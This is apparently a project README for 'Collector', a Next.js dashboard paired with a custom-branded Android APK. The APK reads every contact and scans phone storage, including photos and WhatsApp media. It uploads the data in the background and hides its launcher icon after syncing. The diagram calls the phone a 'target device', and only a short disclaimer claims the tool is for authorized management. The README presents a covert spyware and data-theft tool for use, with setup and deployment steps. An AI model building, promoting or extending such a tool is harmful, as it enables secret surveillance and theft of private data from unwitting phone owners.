# 🛡️ Collector — Access Control Panel

A full-stack web application + Android APK system for remote contact and file management. Build a custom Android app, install it on a device, and manage all contacts & files from a web dashboard.

> **Disclaimer**: This tool is intended for authorized device management only. Use responsibly and in compliance with applicable laws.

---

## ✨ Features

### Website (Control Panel)
- 🟢 **WhatsApp-style UI** — Clean, familiar green-themed interface
- 📇 **Contacts Management** — View, search, copy, download (vCard), share all contacts
- 📁 **File Manager** — Browse all synced files (images, videos, audio, PDFs, docs) with type filters
- 📦 **1-Click ZIP Download** — Download all files + contacts as a single ZIP
- 📊 **Storage Dashboard** — File counts by type, total storage overview
- 🔍 **Search** — Instant search across contacts and files
- 🎨 **Custom App Builder** — Set custom app name & logo, get a branded APK

### Android App
- 📱 **Auto-read Contacts** — Reads all contacts (name, phone, email, organization)
- 📂 **Auto-read Files** — Scans DCIM, Downloads, WhatsApp Media, Documents, etc.
- 🔐 **Permission Flow** — Requests Contact + File Manager + Notification permissions
- 🙈 **Auto-Hide** — App icon disappears from launcher after data sync
- ⬆️ **Background Upload** — Foreground Service uploads files even when app is closed
- 🤖 **Android 14/15 Ready** — Supports API 21–35 (Android 5.0+)

---

## 🚀 Deploy to Vercel (1-Click)

[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/fahad-ahamed/contact-collector&env=DATABASE_URL&envDescription=Database%20URL%20for%20Prisma%20SQLite&envLink=https://pris.ly/d/database-url&project-name=collector)

### Environment Variables

Set these in your Vercel project settings → Environment Variables:

| Variable | Required | Description |
|----------|----------|-------------|
| `DATABASE_URL` | ✅ Yes | Prisma database URL. For Vercel, use `file:./dev.db` or [Turso](https://turso.tech) for persistent storage |
| `UPLOAD_DIR` | ❌ No | File upload directory. Defaults to `/tmp/collector-uploads` (Vercel) |

> ⚠️ **Note on Vercel Limitations**: Vercel's serverless environment has ephemeral filesystem. SQLite data and file uploads will NOT persist between function invocations. For production use with persistent data, consider:
> - **Database**: Use [Turso](https://turso.tech) (SQLite-compatible edge database) — just change `DATABASE_URL` to your Turso connection string
> - **File Storage**: Use [Vercel Blob](https://vercel.com/storage/blob), AWS S3, or Cloudflare R2
> - **APK Building**: Not available on Vercel (requires Android SDK). Use a VPS for this feature

---

## 🖥️ Local Development

### Prerequisites
- Node.js 18+ and npm
- (Optional) Android SDK for APK building

### Setup

```bash
# 1. Clone the repository
git clone https://github.com/fahad-ahamed/contact-collector.git
cd contact-collector

# 2. Install dependencies
npm install

# 3. Set up environment
cp .env.example .env
# Edit .env and set DATABASE_URL

# 4. Initialize database
npx prisma db push

# 5. Run development server
npm run dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

### Environment Variables for Local Dev

Create a `.env` file in the project root:

```env
DATABASE_URL="file:./dev.db"
UPLOAD_DIR="/tmp/collector-uploads"
```

---

## 📱 How It Works

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  Website (You)   │────▶│  Build Custom APK │────▶│  Install on     │
│  collector.app   │     │  Set name & logo  │     │  target device  │
└────────┬────────┘     └──────────────────┘     └────────┬────────┘
         │                                                 │
         │              ┌──────────────────┐               │
         │◀─────────────│  Android App     │◀──────────────┘
         │   Data syncs  │  Auto-reads all  │  User grants
         │   to website  │  contacts + files│  permissions
         │               │  Auto-hides      │
         │               └──────────────────┘
         │
    ┌────▼────┐
    │ View &  │
    │ Manage  │
    │ All Data│
    └─────────┘
```

1. **Set App Name & Logo** — Customize the APK with your branding
2. **Build & Download** — Server compiles a custom Android APK
3. **Install on Device** — The app appears with your custom name & icon
4. **Grant Permissions** — User allows Contact + File Manager access
5. **Auto-Hide** — App vanishes from phone after data sync
6. **Control from Website** — Full access to contacts & files from the dashboard

---

## 🏗️ Tech Stack

| Component | Technology |
|-----------|-----------|
| Frontend | Next.js 16, React 19, Tailwind CSS 4, shadcn/ui |
| Backend | Next.js API Routes, Prisma ORM |
| Database | SQLite (local) / Turso (production) |
| Android | Java (pure Android SDK, no androidx dependencies) |
| Build | Android SDK command-line tools (aapt2, d8, apksigner) |
| Deployment | Vercel / Node.js VPS |

---

## 📂 Project Structure

```
contact-collector/
├── src/
│   ├── app/
│   │   ├── page.tsx              # Landing page with WhatsApp UI
│   │   ├── view/[id]/page.tsx    # Dashboard (Contacts, Files, Manager tabs)
│   │   └── api/
│   │       ├── build-app/        # APK builder endpoint
│   │       ├── contacts/
│   │       │   ├── upload/       # Receive contacts from Android app
│   │       │   └── view/[id]/    # Get session data
│   │       └── files/
│   │           ├── upload/       # Receive file uploads from Android
│   │           ├── file/[fileId] # Download individual file
│   │           └── download/[id] # ZIP download of all session data
│   ├── components/ui/            # shadcn/ui components
│   ├── hooks/                    # React hooks
│   └── lib/                      # Utilities (db, utils)
├── android-app/
│   └── app/src/main/
│       ├── AndroidManifest.xml
│       ├── java/.../MainActivity.java      # Main Android activity
│       ├── java/.../FileUploadService.java # Background file upload service
│       └── res/                            # Android resources
├── prisma/
│   └── schema.prisma            # Database schema
├── vercel.json                  # Vercel deployment config
├── next.config.ts               # Next.js configuration
└── package.json
```

---

## 🤖 Android App Details

### Permissions Requested
| Permission | Purpose |
|-----------|---------|
| `READ_CONTACTS` | Read all phone contacts |
| `MANAGE_EXTERNAL_STORAGE` | Full file manager access (Android 11+) |
| `READ_EXTERNAL_STORAGE` | File access (Android 10 and below) |
| `FOREGROUND_SERVICE` | Background file upload service |
| `FOREGROUND_SERVICE_DATA_SYNC` | Data sync service type (Android 14+) |
| `POST_NOTIFICATIONS` | Upload progress notifications (Android 13+) |
| `INTERNET` | Upload data to website |

### Supported Android Versions
- **Minimum**: Android 5.0 (API 21)
- **Target**: Android 15 (API 35)

---

## 📄 API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/contacts/upload` | Receive contacts + file metadata from Android app |
| `GET` | `/api/contacts/view/[id]` | Get session data with contacts & uploaded files |
| `POST` | `/api/files/upload` | Receive file upload (multipart/form-data) |
| `GET` | `/api/files/file/[fileId]` | Download/preview individual file |
| `GET` | `/api/files/download/[id]` | Download all session data as ZIP |
| `POST` | `/api/build-app` | Build custom APK with name & logo |

---

## 🔧 Production Deployment (VPS)

For full functionality including APK building and persistent storage, deploy on a VPS:

```bash
# Install dependencies
npm install

# Set environment
export DATABASE_URL="file:./production.db"
export UPLOAD_DIR="/var/lib/collector/uploads"

# Initialize database
npx prisma db push

# Build and start
npm run build
npm run start
```

### With Docker (Coming Soon)

```bash
docker build -t collector .
docker run -p 3000:3000 -v collector-data:/app/data collector
```

---

## 📝 License

This project is proprietary software. All rights reserved.

---

<p align="center">
  Built with ❤️ using Next.js & Android SDK
</p>
